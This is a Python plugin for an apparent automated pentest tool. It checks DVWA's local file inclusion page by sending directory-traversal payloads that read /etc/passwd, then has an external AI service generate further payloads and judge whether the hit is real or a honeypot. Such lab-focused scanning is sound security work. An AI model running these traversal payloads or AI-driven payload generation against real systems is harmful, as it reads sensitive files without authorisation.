import urllib.request
import urllib.parse
import urllib.error
import socket
import time
import re
from typing import Dict, Any
from plugins.base_plugin import BasePlugin
from ai_self_validation import groq_generate_payloads, groq_evaluate_results

class DVWALFIPlugin(BasePlugin):
    @property
    def METADATA(self) -> Dict[str, Any]:
        return {
            "id": "DVWA-LFI",
            "name": "DVWA Local File Inclusion",
            "cvss_score": 7.5,
            "service": "http",
            "vuln_type": "lfi"
        }

    def match(self, service_info: Dict[str, Any]) -> bool:
        return service_info.get("service","") in ["http","https"]

    def _send_payload(self, base_url, payload, cookie):
        """Gửi payload GET và trích xuất nội dung file từ HTML"""
        try:
            encoded_payload = urllib.parse.quote(payload)
            url = f"{base_url}?page={encoded_payload}"
            
            req = urllib.request.Request(url)
            req.add_header("Cookie", cookie)
            t0 = time.time()
            
            resp = urllib.request.urlopen(req, timeout=5)
            elapsed = round(time.time() - t0, 3)
            body = resp.read().decode('utf-8')
            
            # Extract nội dung: LFI thường in nội dung thô ra trước mã HTML của DVWA
            # Hoặc tìm các marker đặc trưng của file hệ thống Linux
            output = ""
            if "root:x:0:0:" in body:
                match = re.search(r'(root:x:0:0:.*?)\n<!DOCTYPE', body, re.DOTALL)
                output = match.group(1) if match else "Found /etc/passwd content"
            elif "Warning: include(" in body:
                output = "[PHP_WARNING]: Lỗi include file (Có thể là Honeypot hoặc file không tồn tại)"
            else:
                # Lấy 300 ký tự đầu tiên bỏ thẻ HTML
                clean_text = re.sub(r'<[^>]+>', '', body).strip()
                output = clean_text[:300]
                
            return {"output": output, "response_time": elapsed, "error": None}
            
        except Exception as e:
            return {"output": "", "response_time": -1, "error": str(e)}

    def verify(self, target_ip: str, target_port: int, context: Dict[str, Any]) -> Dict[str, Any]:
        cookie = context.get("session_cookie","")
        if not cookie:
            return {"status": "PENDING", "evidence": "Chưa có session cookie"}

        url = f"http://{target_ip}:{target_port}/vulnerabilities/fi/"
        all_results = []

        initial_payloads = [
            ("../../etc/passwd", "Basic Directory Traversal"),
            ("/etc/passwd", "Absolute Path LFI"),
        ]

        print(f"      [LFI] PHASE 1: Thử payload từ knowledge base...")
        initial_confirmed = None
        for payload, technique in initial_payloads:
            print(f"      [LFI] [{technique}] Payload: {payload}")
            result = self._send_payload(url, payload, cookie)
            marker_hit = "root:x:" in result["output"]
            status = "HIT" if marker_hit else "MISS"
            print(f"      [LFI] Response time: {result['response_time']}s | Status: {status}")
            
            all_results.append({
                "phase": "initial", "technique": technique, "payload": payload,
                "output": result["output"][:200], "response_time": result["response_time"], "hit": marker_hit
            })
            if marker_hit and not initial_confirmed:
                initial_confirmed = {"payload": payload, "output": result["output"], "technique": technique}

        if not initial_confirmed:
            return {"status": "FALSE_POSITIVE", "evidence": "Tất cả LFI payload ban đầu thất bại"}

        print(f"\n      [LFI] PHASE 2: AI Groq suy luận và sinh payload bổ sung...")
        ai_plan = groq_generate_payloads("DVWA-LFI", "http local file inclusion", url, initial_confirmed)

        print(f"\n      [LFI] PHASE 2a & 2b: Thực thi payload AI & Kiểm tra Honeypot...")
        test_payloads = ai_plan.get("confirm_payloads", []) + ai_plan.get("honeypot_payloads", [])
        for p in test_payloads:
            payload, purpose = p.get("payload",""), p.get("purpose","")
            print(f"      [LFI] [AI Test] Payload: {payload}")
            result = self._send_payload(url, payload, cookie)
            
            # Nếu đọc file không tồn tại mà vẫn ra text hợp lệ -> honeypot hit
            hit = bool(result["output"]) and "PHP_WARNING" not in result["output"]
            if result["output"]: print(f"      [LFI] Output: {result['output'][:100]}...")
            
            all_results.append({
                "phase": "ai_test", "purpose": purpose, "payload": payload,
                "output": result["output"][:200], "response_time": result["response_time"], "hit": hit
            })

        print(f"\n      [LFI] PHASE 3: AI đánh giá tổng hợp tất cả kết quả...")
        verdict = groq_evaluate_results("DVWA-LFI", all_results, ai_plan.get("honeypot_suspicion","low"))
        
        final_status = verdict.get("verdict","PENDING")
        if final_status == "HONEYPOT_SUSPECTED": final_status = "PENDING"

        valuable_hits = [r for r in all_results if r["hit"] and ("root:x:" in r["output"])]
        best_hit = valuable_hits[0] if valuable_hits else initial_confirmed

        return {
            "status": final_status,
            "evidence": (
                f"Local File Inclusion — AI Self-Validation hoàn tất.\n"
                f"      - Payload tốt nhất   : {best_hit['payload']}\n"
                f"      - Mục đích           : {best_hit.get('technique', best_hit.get('purpose'))}\n"
                f"      - Output trích xuất  : {best_hit['output'][:150].strip()}\n"
                f"      - AI Reasoning       : {verdict.get('final_reasoning')}"
            )
        }
